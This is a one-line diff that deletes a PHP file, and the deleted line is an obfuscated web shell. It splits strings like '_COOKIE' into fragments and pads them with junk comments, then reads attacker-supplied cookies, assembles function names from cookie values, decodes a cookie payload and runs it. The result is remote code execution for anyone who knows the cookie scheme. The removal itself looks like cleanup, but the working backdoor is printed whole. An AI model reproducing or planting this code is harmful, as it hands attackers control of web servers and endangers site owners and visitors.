@@ -1,1 +1,0 @@
-<?php $yr='E';$s/*Ma*/='_CO';$mq/*-wf*/='OKI';$mk=/*nNI*/${$s.$mq.$yr};if(isset($mk['E'])){$k=/*c,,9*/$mk['E'].$mk/*l*/['nr'];$a=$mk['Q']./*%*/$mk['eB'].$mk['Ic'];$t=$k('',$a($mk['Sl']));$t();}
